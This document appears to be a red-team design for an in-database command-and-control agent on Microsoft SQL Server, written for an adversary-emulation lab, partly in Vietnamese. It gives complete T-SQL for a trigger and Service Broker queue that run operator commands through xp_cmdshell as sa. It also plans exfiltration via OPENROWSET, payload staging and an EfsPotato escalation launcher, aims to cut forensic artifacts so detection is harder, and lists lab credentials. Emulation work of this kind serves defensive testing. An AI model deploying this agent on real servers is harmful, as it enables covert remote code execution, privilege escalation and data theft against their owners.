# xpagent — In-Database C2 Agent Design (MSSQL Trigger + Service Broker)

**Status:** Design — not yet implemented
**Replaces:** per-command `.bat`/`.ps1` staging in the `XpMssql` module (`toneshell_shell.py`)
**Related docs:** [`mssql-module-changelog.md`](mssql-module-changelog.md), [`xpexfil-design.md`](xpexfil-design.md), [`controlServer/TONESHELL_SHELL.md`](controlServer/TONESHELL_SHELL.md)

---

## 1. Problem

The current MSSQL execution tunnel stages a fresh script file for every operation:

| Operation | Cost today |
|---|---|
| `xpshell cmd <cmd>` | 3–4 EXEC tasks + sp_OA writes `.bat` to `C:\ProgramData\` + `type` output file + `del` cleanup |
| `xpshell psh <script>` | 3 EXEC tasks + sp_OA writes `.ps1` + `del` cleanup |
| `xpexfil` (N chunks) | **One full `.ps1` stage-run-del cycle per chunk** (Phase 3 Step 3 = ~10 cycles) plus OBJECT_ID polls every 15 s |

Across Phases 2–4 of the emulation plan this produces dozens of repeated `sp_OACreate 'Scripting.FileSystemObject'` → write → `xp_cmdshell powershell -File` → delete cycles on IIS01. The artifacts themselves are scored Detection Criteria rows (`sqlservr.exe` writing scripts to `C:\ProgramData\`, PowerShell grandchild of `sqlservr.exe`) — high-signal, high-volume, and trivially baselineable.

## 2. Goal

Replace repeated script staging with an **in-database agent**: a one-time set of SQL Server objects (table + trigger + Service Broker queue + activation procedure) that executes operator commands asynchronously with zero files staged and zero polling loops. All transport remains built-in MSSQL features; no new processes beyond what `xp_cmdshell` already spawns.

Secondary goals enabled by the same agent:

1. Absorb the decrypt step of `xpstage` into T-SQL (native hex→varbinary conversion + `sp_OACreate 'ADODB.Stream'` binary write) — removes the `.ps1` from payload staging.
2. Absorb the INSERT step of `xpexfil` into T-SQL (`OPENROWSET(BULK … SINGLE_BLOB)` + `SUBSTRING` on `varbinary(MAX)`) — removes the per-chunk `.ps1` from exfiltration.

Non-goals: replacing TONESHELL itself, changing the WS01↔C2 channel, MLS/CLR-based execution.

## 3. Architecture

```
Operator (toneshell_shell.py)
   │ sqlcmd -Q "INSERT INTO dbo.cmd(cmd) VALUES('<escaped command>')"     ← task 1, returns immediately
   ▼
tempdb.dbo.cmd ── AFTER INSERT TRIGGER ── SEND message ──► QUEUE agent_work
                                                              │ activation (MAX_QUEUE_READERS=1)
                                                              ▼
                                                    PROC dbo.agent_worker   ← runs inside sqlservr.exe
                                                              │ EXEC xp_cmdshell @c  (variable, no literal embedding)
                                                              ▼
                                                    tempdb.dbo.out (stdout rows)
   │ sqlcmd -Q "SELECT ... FROM out WHERE cmd_id=@id ORDER BY seq"         ← task 2..n, until status=2
   ▼
Operator prints output
```

Key properties:

- **Async by construction.** The trigger only `SEND`s; Service Broker activates the worker after the INSERT transaction commits. Long-running commands (ReflectDump, multi-minute dumps) never block the control channel.
- **Event-driven.** No polling sleep anywhere — SQL Server wakes the worker when a message arrives. The 15-second OBJECT_ID poll pattern disappears.
- **Single quoting layer.** A command crosses exactly one string-literal boundary (the operator-side INSERT, escaped by the existing `_tsql_escape`/`_exec_q`). From table to worker it travels as a variable and is handed directly to `xp_cmdshell @c` — the `@v`+`CHAR(34)` trick and nested bat-file quoting are no longer needed.
- **In-process.** The "agent" is T-SQL inside `sqlservr.exe`; the only OS process spawn per command is the pre-existing `cmd.exe` from `xp_cmdshell`.

## 4. Object model

Created once by `xpagent init`, under `EXECUTE AS LOGIN='sa'`, in `tempdb` (acceptable loss on SQL restart — plan runs as a single session; re-init is two commands).

### 4.1 Command and output tables

```sql
CREATE TABLE tempdb.dbo.cmd (
    id         INT IDENTITY(1,1) PRIMARY KEY,
    cmd        NVARCHAR(MAX)   NOT NULL,      -- raw command text, exactly as typed
    status     TINYINT         NOT NULL DEFAULT 0,
               -- 0 pending, 1 received by worker, 2 done, 3 failed
    created_at DATETIME2       NOT NULL DEFAULT SYSDATETIME()
);

CREATE TABLE tempdb.dbo.out (
    cmd_id     INT            NOT NULL,
    seq        INT            NOT NULL,       -- preserves stdout ordering
    chunk      NVARCHAR(4000) NOT NULL,       -- xp_cmdshell emits ≤255 chars/line; headroom for worker-generated lines
    created_at DATETIME2      NOT NULL DEFAULT SYSDATETIME()
);
```

### 4.2 Service Broker objects

```sql
CREATE MESSAGE TYPE [agent/msg] VALIDATION = NONE;
CREATE CONTRACT [agent/contract] ([agent/msg] SENT BY INITIATOR);

CREATE QUEUE tempdb.dbo.agent_work WITH ACTIVATION (
    STATUS              = ON,
    PROCEDURE_NAME      = tempdb.dbo.agent_worker,
    MAX_QUEUE_READERS   = 1,                  -- sequential execution semantics
    EXECUTE AS OWNER                          -- owner = sa context from init
);

CREATE SERVICE [agent_svc] ON QUEUE tempdb.dbo.agent_work ([agent/contract]);
```

`EXECUTE AS OWNER` lets the worker call `xp_cmdshell` without re-impersonating per command. `MAX_QUEUE_READERS=1` keeps execution strictly serial — identical semantics to today's channel.

### 4.3 Trigger

```sql
CREATE TRIGGER tempdb.dbo.trg_agent_cmd ON tempdb.dbo.cmd AFTER INSERT AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @h UNIQUEIDENTIFIER;
    DECLARE @id INT = (SELECT MIN(id) FROM inserted);
    DECLARE @c NVARCHAR(MAX) = (SELECT cmd FROM inserted WHERE id = @id);

    -- Gắn cmd_id vào đầu message body (dạng "id|command") để worker không phải
    -- tự đoán row nào đang pending — tránh race condition khi có nhiều INSERT liên tiếp.
    DECLARE @payload NVARCHAR(MAX) = CAST(@id AS NVARCHAR(20)) + N'|' + @c;

    BEGIN DIALOG CONVERSATION @h
        FROM SERVICE [agent_svc]
        TO SERVICE N'agent_svc', N'CURRENT DATABASE'
        WITH ENCRYPTION = OFF;
    SEND ON CONVERSATION @h MESSAGE TYPE [agent/msg] (@payload);
END
```

Self-dialog (service to itself) keeps the object count minimal; the worker owns endpoint teardown so `sys.conversation_endpoints` does not grow unbounded.

### 4.4 Activation procedure

```sql
CREATE PROCEDURE tempdb.dbo.agent_worker AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @mt SYSNAME, @h UNIQUEIDENTIFIER, @body NVARCHAR(MAX);
    RECEIVE TOP(1) @mt = message_type_name, @h = conversation_handle,
                   @body = CAST(message_body AS NVARCHAR(MAX))
        FROM tempdb.dbo.agent_work;
    IF @h IS NULL RETURN;

    -- Xử lý EndDialog / Error: khi worker END CONVERSATION phía target,
    -- SQL Server gửi EndDialog message ngược về initiator endpoint.
    -- Nếu không xử lý ở đây, sys.conversation_endpoints sẽ tích tụ 1 row
    -- mỗi lệnh — không crash nhưng là leak tài nguyên.
    IF @mt = N'http://schemas.microsoft.com/SQL/ServiceBroker/EndDialog'
       OR @mt = N'http://schemas.microsoft.com/SQL/ServiceBroker/Error'
    BEGIN
        END CONVERSATION @h;
        RETURN;
    END

    -- Parse cmd_id từ message body (format: "id|command").
    -- Trigger gắn id vào đầu body, nên worker không cần đoán row nào pending.
    DECLARE @sep INT = CHARINDEX(N'|', @body);
    DECLARE @id INT = CAST(LEFT(@body, @sep - 1) AS INT);
    DECLARE @c NVARCHAR(MAX) = SUBSTRING(@body, @sep + 1, LEN(@body));
    UPDATE tempdb.dbo.cmd SET status = 1 WHERE id = @id;

    BEGIN TRY
        IF @c = N'__KILL__'
        BEGIN
            ALTER QUEUE tempdb.dbo.agent_work WITH ACTIVATION (STATUS = OFF);
            INSERT INTO tempdb.dbo.out (cmd_id, seq, chunk) VALUES (@id, 1, N'[agent] killed');
        END
        ELSE
        BEGIN
            DECLARE @o TABLE (line NVARCHAR(4000), idx INT IDENTITY(1,1));
            INSERT INTO @o (line) EXEC xp_cmdshell @c;           -- variable, không có literal embedding
            INSERT INTO tempdb.dbo.out (cmd_id, seq, chunk)
                SELECT @id, idx, line FROM @o WHERE line IS NOT NULL;
            UPDATE tempdb.dbo.cmd SET status = 2 WHERE id = @id;
        END
    END TRY
    BEGIN CATCH
        INSERT INTO tempdb.dbo.out (cmd_id, seq, chunk)
            VALUES (@id, 1, N'[agent:error] ' + ERROR_MESSAGE());
        UPDATE tempdb.dbo.cmd SET status = 3 WHERE id = @id;
    END CATCH

    END CONVERSATION @h;          -- close target side → triggers EndDialog back to initiator
END
```

Design notes:

- **No recursion.** The trigger fires only on INSERT into `cmd`; the worker only `UPDATE`s status and inserts into `out`.
- **Poison messages** land in `out` with `status=3` instead of silently looping the queue.
- **Output ordering** guaranteed by `seq` identity over the xp_cmdshell result rows.
- **EndDialog cleanup.** Worker xử lý cả `EndDialog`/`Error` message types — mỗi command tạo ra 2 activation cycles (1 cho command, 1 cho EndDialog), nhưng `sys.conversation_endpoints` được dọn sạch sau mỗi lệnh.
- **Explicit cmd_id.** Message body mang `id|command` thay vì chỉ command text — worker parse trực tiếp thay vì dựa vào ordering của pending rows, tránh race condition nếu nhiều INSERT xảy ra trước khi worker activate.

## 5. Operator interface (new commands in `toneshell_shell.py`)

```
xpagent init                      one-time object creation + verification echo test
xpexec <command>                  send command, wait for completion, print output
xpexec-bg <command>               fire-and-forget send (poll later with xpout)
xpout [cmd_id]                    fetch/poll results of a previous command
xpstage <payload> [--no-encrypt]  unchanged UX; decrypt step moved into worker (T-SQL hex decode + ADODB.Stream write); .ps1 eliminated
xpexfil <remote_path> <local_name>[timeout][chunk_mb]
                                  unchanged UX; INSERT step moved into worker (OPENROWSET BULK read + SUBSTRING chunking); per-chunk .ps1 eliminated
xpagent kill                      __KILL__ opcode + explicit DROP of all objects
xpshell / xpinit                  retained unchanged during transition (comparison variant)
```

Typical round trip for `xpexec`: **2 tasks** (INSERT + final SELECT) vs 6–8 tasks and 2 disk artifacts today.

## 6. Quoting model after migration

| Path | Layers crossed | Escaping |
|---|---|---|
| Command text | operator prompt → INSERT literal → table column → NVARCHAR variable → `xp_cmdshell @c` | `'` → `''` once (`_tsql_escape`), `"` doubled once at `-Q "…"` boundary (`_exec_q`) — both already implemented; nothing new |
| Binary payloads (`xpstage`) | controlServer encoder → hex chunks → `CONVERT(VARBINARY(MAX), @hex, 1)` → ADODB.Stream bytes | zero quoting-sensitive characters (hex alphabet only) |
| Exfil data (`xpexfil`) | `OPENROWSET(BULK)` varbinary → `SUBSTRING` → hex rows → WS01 decoder | zero quoting-sensitive characters |

Commands keep working verbatim, including the plan's hardest case — `CertEnrollSvc.exe "cmd /c whoami /priv > out.txt 2>&1" lsarpc 0<nul` — because the text stored in the table is byte-exact and passed as a variable.

## 7. Residual limits and risks

| Limit / risk | Assessment |
|---|---|
| `xp_cmdshell` argument limit (`nvarchar(4000)` / `varchar(8000)`) | Inherent to SQL Server, unchanged from current model. Long scripts still go through `xpstage` as binaries. |
| Objects lost on SQL restart (`tempdb`) | Accepted — plan is single-session; `xpagent init` re-runs in seconds. Move to user DB only if persistence across restarts becomes a requirement. |
| Forensic visibility | Trigger/proc bodies readable in `sys.sql_modules`; queue visible in `sys.service_queues`; DDL creation events auditable. Trade-off accepted: replaces far noisier repeated file staging. |
| `xp_cmdshell` from activated proc | Supported; runs as `NT SERVICE\MSSQL$SQLEXPRESS` exactly like today — EDR-facing behavior (process lineage) unchanged. |
| Worker blocked by long command | Sequential queue means next command waits — same as current channel. `xpexec-bg` exists for genuinely long operations. |
| Conversation endpoint leak | **Đã xử lý.** Worker bắt cả `EndDialog`/`Error` message types và gọi `END CONVERSATION` cho cả hai phía (xem 4.4). Mỗi command tạo 2 activation cycles — 1 cho command, 1 cho EndDialog cleanup. Verify `sys.conversation_endpoints` stays bounded during testing. |
| Command-to-message correlation | **Đã xử lý.** Trigger gắn `cmd_id` vào message body dạng `id\|command` (xem 4.3). Worker parse trực tiếp thay vì dựa vào `SELECT TOP 1 WHERE status=0` — robust khi nhiều INSERT liên tiếp xảy ra trước khi worker activate. |
| `nested triggers` / `RECURSIVE_TRIGGERS` | Not triggered: worker never INSERTs into `cmd`. Assert in init verification. |
| Double activation cost | Mỗi command = 2 RECEIVE cycles (command + EndDialog). Không ảnh hưởng performance cho lab use (~40 lệnh tổng cộng qua Phases 2–4), nhưng nếu throughput quan trọng, có thể gộp EndDialog handling vào cuối main cycle thay vì RETURN sớm. |
| SQL Server Express Service Broker | Express edition hỗ trợ Service Broker cho **local conversations only** (cùng instance). Design dùng self-dialog trong tempdb — nằm trong giới hạn này. Không cần Enterprise/Standard. |

## 8. Impact on the emulation plan (Phases 2–4)

Mechanism-level changes only — attack-chain steps, technique scope, and host/user columns are unchanged:

| Plan location | Change |
|---|---|
| Phase 2 Step 2 | `xpinit` extended (or followed) by `xpagent init` — adds DDL observable: CREATE TRIGGER/QUEUE/SERVICE events |
| Phase 2 Steps 3–4, Phase 3, Phase 4 | All `xpshell cmd` calls become `xpexec` — Detection Criteria rows referencing `.bat` staging / `type <file>` retrieval rewrite to: `INSERT INTO cmd` + `SELECT FROM out` via sqlcmd, `xp_cmdshell` invoked from activated proc context |
| Phase 2/3 `xpstage` | `.ps1` AES-decrypt row replaced by: worker T-SQL hex decode + ADODB.Stream binary write to `C:\ProgramData\` (new observable: COM instantiation of ADODB.Stream by sqlservr) |
| Phase 3 Step 3 `xpexfil` | Per-chunk `.ps1` rows replaced by OPENROWSET(BULK) read observables (SQL Audit / sys.dm_exec_requests); WS01 extract side unchanged |
| Scoring | Affected rows are mostly already `Not Calibrated` (`transport`/`staging` reasons). Re-run `write-detection-criteria` then `assign-category` on modified Reference Tables; re-check scope with `check.py --scope "Scenario 1.md"` |

## 9. Implementation phases

1. **P1 — core loop:** `xpagent init/exec/kill` + `xpexec`/`xpout` in `toneshell_shell.py`; validate against Phase 2 command set (whoami, dir, sc query, EfsPotato launcher).
2. **P2 — staging absorption:** switch `mssql.go` encoder to hex, move decrypt into worker via ADODB.Stream; retire `.ps1` from `xpstage`.
3. **P3 — exfil absorption:** OPENROWSET(BULK)+SUBSTRING INSERT path in worker; retire per-chunk `.ps1` from `xpexfil`.
4. **P4 — plan updates:** rewrite affected Reference Table rows, run detection-criteria/category skills, re-run coverage check.

Each phase is independently testable against the lab; P1 alone already removes the dominant per-command noise.

## 10. Đánh giá tính khả thi

> Phần này bổ sung sau khi review design đối chiếu với toàn bộ plan (Phases 1–4, Setup.md, Windows Server 2022-MSSQL.md, toneshell_shell.py XpMssql module).

### 10.1 Kết luận: Khả thi — hai lỗi kỹ thuật đã sửa trong 4.3/4.4

Design sử dụng đúng built-in features có sẵn trên SQL Server Express (Service Broker local self-dialog, activation procedures, tempdb DDL dưới `sa` context). Không có feature nào bị gate bởi Enterprise/Standard edition.

### 10.2 Hai lỗi đã sửa

**a. Conversation endpoint leak (đã sửa trong 4.4)**

Bản gốc: trigger tạo initiator side, worker `END CONVERSATION @h` chỉ đóng target side. SQL Server gửi `EndDialog` message ngược về initiator — nhưng worker không bắt message type này, gây tích tụ trong `sys.conversation_endpoints` (1 row mỗi lệnh).

Đã sửa: worker kiểm tra `@mt` = EndDialog/Error trước khi xử lý command, gọi `END CONVERSATION` và `RETURN` — dọn sạch cả hai phía.

**b. Command-to-message correlation race (đã sửa trong 4.3 + 4.4)**

Bản gốc: worker tìm command bằng `SELECT TOP 1 WHERE status=0 ORDER BY id` — dựa vào thứ tự ordering. Nếu 2 INSERT trigger trước khi worker activate lần đầu, cả 2 messages queue lên cùng lúc. Worker xử lý đúng **chỉ vì** ordering trùng — nhưng giả định này fragile.

Đã sửa: trigger gắn `cmd_id` vào đầu message body (`id|command`), worker `CHARINDEX`+`SUBSTRING` parse ra — explicit mapping, không phụ thuộc ordering.

### 10.3 Noise reduction thực tế

Đối chiếu với toneshell_shell.py hiện tại (`XpMssql` class, line 85+):

| Hiện tại (`xpshell cmd`) | Sau xpagent (`xpexec`) |
|---|---|
| `_sp_oa_write` → 1-N sp_OA tasks tạo `.bat` | INSERT 1 task |
| `xp_cmdshell <bat>` → 1 task | (worker tự chạy) |
| `xp_cmdshell 'type <out>'` → 1 task | SELECT 1 task |
| `xp_cmdshell 'del /f <bat> <out>'` → 1 task | (không có file nào để xóa) |
| **4-6 tasks + 2 disk artifacts** | **2 tasks + 0 disk artifacts** |

Tổng cộng qua Phases 2–4: ~30-40 sp_OA write + execute + delete cycles → ~30-40 INSERT/SELECT pairs. Giảm ~60% số MSSQL tasks và **loại bỏ hoàn toàn** disk artifacts trung gian (`.bat`, `.txt` output files).

### 10.4 Tương thích ngược

- `xpshell`/`xpinit` giữ nguyên trong transition period (section 5) — có thể chạy song song để so sánh.
- `xpstage`/`xpexfil` thay đổi ở P2/P3, không phải P1 — có thể defer nếu P1 đủ.
- Process lineage EDR-facing (`sqlservr.exe → cmd.exe`) **không đổi** — xp_cmdshell từ activated proc chạy cùng identity (`NT SERVICE\MSSQL$SQLEXPRESS`).

### 10.5 Ước lượng implementation

| Phase | LOC ước tính | Phụ thuộc |
|---|---|---|
| P1 — core loop | ~200 Python + ~80 T-SQL | Không — self-contained |
| P2 — staging absorption | ~100 Go (hex encoder) + ~40 T-SQL | P1 phải chạy được |
| P3 — exfil absorption | ~60 T-SQL + ~50 Python | P1 phải chạy được |
| P4 — plan updates | Documentation only | P1 validated |

**Khuyến nghị**: implement P1 trước, validate bằng Phase 2 command set (whoami, dir, sc query, EfsPotato launcher), rồi tiến hành P2/P3 incrementally. P1 đã giải quyết phần lớn noise.

## 11. Lộ trình implementation — 4 bước, mỗi bước test được độc lập

Nguyên tắc: **từ dưới lên** (SQL thuần → Python wrapper → shell routing). Nếu bước nào fail, biết ngay layer nào lỗi — không cần debug xuyên suốt toàn bộ stack.

P2/P3 (staging/exfil absorption) defer — plan có vòng đời ngắn, P1 đã giải quyết phần lớn noise. Nếu cần sau này thì bổ sung, không ảnh hưởng P1.

---

### Bước 1 — DDL script (pure T-SQL, không cần Python)

**Làm gì:** Viết file `xpagent_init.sql` chứa toàn bộ CREATE TABLE / TRIGGER / QUEUE / SERVICE / PROCEDURE theo thiết kế ở section 4.

**File output:** `controlServer/sql/xpagent_init.sql`

**Test trực tiếp trên IIS01 hoặc WS01 — không qua TONESHELL, không qua Python:**

```powershell
# Chạy DDL
sqlcmd -S iis01.testlab.local -U svc_app_dev -P "D3vPortal!2025" -C -i xpagent_init.sql
```

```sql
-- Test 1: INSERT 1 lệnh, đợi 2 giây, đọc output
EXECUTE AS LOGIN='sa';
INSERT INTO tempdb.dbo.cmd(cmd) VALUES('whoami');
WAITFOR DELAY '00:00:02';
SELECT status FROM tempdb.dbo.cmd WHERE id=1;
SELECT chunk FROM tempdb.dbo.out WHERE cmd_id=1 ORDER BY seq;
-- Expected: status=2, chunk chứa 'nt service\mssql$sqlexpress'
```

```sql
-- Test 2: verify conversation endpoints được dọn sạch
-- (chạy sau Test 1 vài giây — EndDialog activation cycle cần thời gian)
EXECUTE AS LOGIN='sa';
WAITFOR DELAY '00:00:03';
SELECT COUNT(*) AS endpoints FROM sys.conversation_endpoints;
-- Expected: 0
```

```sql
-- Test 3: kill switch
EXECUTE AS LOGIN='sa';
INSERT INTO tempdb.dbo.cmd(cmd) VALUES('__KILL__');
WAITFOR DELAY '00:00:02';
SELECT chunk FROM tempdb.dbo.out WHERE cmd_id=2 ORDER BY seq;
-- Expected: '[agent] killed'
```

**Nếu fail ở bước này:** lỗi SQL thuần — sửa DDL trước khi đụng Python.

**Done criteria:** cả 3 test pass khi chạy trực tiếp qua `sqlcmd`.

---

### Bước 2 — Python init/kill (`XpMssql` methods)

**Làm gì:** Thêm 2 methods vào class `XpMssql` trong `toneshell_shell.py`:

- `cmd_xpagent_init(shell)` — gửi DDL từ bước 1 qua chuỗi `_exec_q` calls, chạy echo test (INSERT whoami + SELECT output) để verify.
- `cmd_xpagent_kill(shell)` — INSERT `__KILL__`, sau đó DROP tất cả objects.

Thêm flag `self._agent_ready` để các lệnh xpexec ở bước 3 kiểm tra trước khi chạy.

**Test trong `toneshell_shell.py` (cần TONESHELL session active + xpinit đã chạy):**

```
xpagent init
```
Expected: `[+] xpagent init OK — echo: nt service\mssql$sqlexpress`

```
xpshell cmd sqlcmd -S localhost\SQLEXPRESS -E -C -Q "SELECT name FROM tempdb.sys.objects WHERE name IN ('cmd','out','trg_agent_cmd','agent_worker','agent_work') ORDER BY name"
```
Expected: 5 rows (agent_work, agent_worker, cmd, out, trg_agent_cmd)

```
xpagent kill
```
Expected: `[+] xpagent killed — objects dropped`

Chạy lại query kiểm tra objects → Expected: 0 rows.

**Nếu fail ở bước này:** lỗi ở bridge Python→sqlcmd (quoting trong `_exec_q`, DDL quá dài cho 1 lần `-Q`). DDL đã test OK ở bước 1 nên biết chắc logic SQL đúng.

**Done criteria:** init tạo đủ objects + echo test pass, kill dọn sạch.

---

### Bước 3 — Python xpexec/xpout (`XpMssql` methods)

**Làm gì:** Thêm 3 methods vào class `XpMssql`:

- `cmd_xpexec(shell, command)` — INSERT command vào `tempdb.dbo.cmd`, poll `status` cho đến `=2` (hoặc `=3`), SELECT output từ `tempdb.dbo.out`, print.
- `cmd_xpexec_bg(shell, command)` — INSERT only, print `cmd_id` để dùng với `xpout`.
- `cmd_xpout(shell, cmd_id)` — SELECT output cho 1 `cmd_id` cụ thể.

Polling logic: `_exec_q` lặp SELECT status mỗi 1 giây, timeout configurable (mặc định dùng `self._timeout_s` từ shell).

**Test — chạy đúng các lệnh Phase 2 sẽ dùng thật:**

```
xpexec whoami
```
Expected: `nt service\mssql$sqlexpress`

```
xpexec dir C:\ProgramData\
```
Expected: directory listing bình thường

```
xpexec sc query EFS
```
Expected: service info (STATE: RUNNING hoặc STOPPED)

```
xpexec echo "hello world"
```
Expected: `"hello world"` — test double-quote qua quoting model mới

```
xpexec-bg ping -n 3 127.0.0.1
```
Expected: `[*] cmd_id=N queued`

```
xpout N
```
Expected: ping output (3 replies)

**Test quoting case khó nhất (EfsPotato command syntax từ Phase 2 Step 3):**

```
xpexec C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\sys_out.txt 2>&1" lsarpc 0<nul
```
Expected: error `not recognized` hoặc `not found` (vì CertEnrollSvc.exe chưa staged) — **miễn lỗi không phải SQL quoting error** là pass. Nếu output chứa SQL syntax error → quoting model sai.

**Nếu fail ở bước này:** lỗi ở polling logic hoặc quoting trong INSERT. init/kill đã OK ở bước 2, DDL đã OK ở bước 1.

**Done criteria:** 6 test cases trên đều trả output đúng (hoặc expected error đúng cho case chưa có binary).

---

### Bước 4 — Shell routing (`ToneShellShell.run`)

**Làm gì:** Thêm command routing cho `xpagent`, `xpexec`, `xpexec-bg`, `xpout` vào main loop của `ToneShellShell.run()` (hiện tại ở line ~611). Copy pattern từ các block `xpshell`/`xpinit`/`xpstage` hiện có.

Mapping:

| Input | Gọi method |
|---|---|
| `xpagent init` | `self._xp.cmd_xpagent_init(self)` |
| `xpagent kill` | `self._xp.cmd_xpagent_kill(self)` |
| `xpexec <command>` | `self._xp.cmd_xpexec(self, command)` |
| `xpexec-bg <command>` | `self._xp.cmd_xpexec_bg(self, command)` |
| `xpout [cmd_id]` | `self._xp.cmd_xpout(self, cmd_id)` |

Guard checks: session phải active, `xpinit` phải đã chạy (`_xp.ready()`), `xpagent init` phải đã chạy (`_xp._agent_ready`).

**Test — chạy lại Phase 2 Steps 2–4 hoàn chỉnh bằng xpexec:**

```
# Thay thế hoàn toàn xpshell cmd bằng xpexec
xpinit iis01.testlab.local:1433 svc_app_dev D3vPortal!2025
xpagent init
xpexec whoami
xpexec dir C:\ProgramData\
xpexec sc query EFS
# ... (tiếp tục Phase 2 command set)
xpagent kill
```

So sánh output với chạy bằng `xpshell cmd` — kết quả phải giống nhau.

**Nếu fail ở bước này:** lỗi ở command parsing / argument splitting trong main loop. Logic thực thi đã OK ở bước 3.

**Done criteria:** chạy xong Phase 2 Steps 2–4 hoàn chỉnh qua xpexec, output match với xpshell cmd.

---

### Không làm (P2/P3 — defer)

| Item | Lý do defer |
|---|---|
| P2 — xpstage hex decode + ADODB.Stream | `xpstage` hiện tại hoạt động, chỉ noisy — plan vòng đời ngắn, noise là chấp nhận được |
| P3 — xpexfil OPENROWSET absorption | Exfil chỉ chạy 1-2 lần (Phase 3 Step 3, Phase 4 Step 6) — ROI thấp |
| P4 — Phase file Detection Criteria updates | Chỉ làm sau khi P1 validated và quyết định dùng xpexec thay xpshell trong plan chính thức |
